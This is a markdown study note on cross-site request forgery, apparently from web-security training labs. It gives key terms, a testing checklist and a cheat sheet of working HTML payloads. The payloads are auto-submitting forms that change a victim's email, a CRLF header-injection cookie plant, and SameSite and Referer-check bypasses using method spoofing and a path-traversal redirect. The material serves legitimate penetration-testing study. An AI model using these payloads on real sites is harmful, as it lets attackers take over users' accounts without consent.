# CSRF

## Key Terms

```
- Engagment tools -> Generate CSRF PoC (Burp Professional)
- SameSite: 
	-> Lax (default depends browser) -> only GET
	-> Strict -> only same site requests
	-> None -> secure flag required (https)
	
- \r\n -> %0d %0a
- Method spoofing -> search engine, e.g> _method=POST , @method('POST'), method=POST etc
```

## Most important labs


- [CSRF bypassing SameSite=Strict restriction via redirect + path traversal + CSRF](CSRF-bypass-SameSite-Strict-via-redirect-path-traversal.md)

- [CSRF bypassing SameSite=Lax via method spoofing](CSRF-bypass-SameSite-Lax-via-method-spoofing.md)

- [CSRF via Header Injection in Duplicated Cookie (SameSite-Strict bypass via client-side redirect)](CSRF-via-Header-Injection-SameSite-Strict-client-side-redirect.md)


## Metodology

```bash
- Try switch POST to GET
- Remove csrf token
- Token not tied to account -> Try valid (our) csrf token
- Cookie ->
    > csrf token + username/email
    > try duplicate cookie %0d %0a + Header Injection
- Same cookie work in differents subdomains
- No same-site? -> after 2 mins same-site = lax
- Same-Site = strict? -> search redirect 
- Try remove Refered header
  ```

![CSRF-MAP-CASES](/04-Screenshots/CSRF-map.png)


#### Cheat Sheet

```html

// CSRF NO DEFENSES  / TRY WITH GET INSTEAD POST
<form class="login-form" name="change-email-form" action="<IP>/my-account/change-email" method="POST">
	 <input type="hidden" type="email" name="email" value="foo@foo.com">    
</form>

<script>
    document.forms[0].submit();
</script>
//
// CSRF TOKEN NO TIED COOKIE SESSION
<form class="login-form" name="change-email-form" action="<IP>/my-account/change-email" method="POST">
	 <input type="hidden" type="email" name="email" value="foo@foo.com">    
	 <input type="hidden" type="email" name="csrf" value="<CSRF-TOKEN>"> 
</form>

<script>
    document.forms[0].submit();
</script>
//
// CSRF + Header injection - csrf token tied to csrfKey
<form class="login-form" name="change-email-form" action="<IP>/my-account/change-email" method="POST">
	 <input type="hidden" type="email" name="email" value="foo@foo.com">    
	 <input type="hidden" type="email" name="csrf" value="<CSRF-TOKEN>"> 
</form>

<img src="https://<IP>/?search=test%0d%0aSet-Cookie:%20csrfKey=<CSRF-KEY-MATCH>%3b%20SameSite=None" onerror="document.forms[0].submit()">
//
// SAME-SITE LAX (DEFAULT) + METHOD SPOOFING
<script>
    document.location = "<IP>/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
//
// SAMESITE STRICT BYPASS VIA CLIENT-SIDE REDIRECT
<script>
    location="<IP>/post/comment/confirmation?postId=../../my-account/change-email?email=pwnd@pwned.com%26submit=1"
</script>
//
// CSRF where Referer validation depends on header being present (add this to normal csrf to remove Refered header)
<meta name="referrer" content="no-referrer">
//
// CSRF with broken Referer validation
Referrer-Policy: unsafe-url (http header)

<form class="login-form" name="change-email-form" action="https://<IP>/my-account/change-email" method="POST">
	 <input type="hidden" type="email" name="email" value="foo@foo.com">    
</form>

<script>
   history.pushState("", "", "/?0ad0008e0432189380d1444800d90040.web-security-academy.net/")
    document.forms[0].submit();
</script>

// METHOD SPOOFING
<script>
    document.location = "<IP>/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```


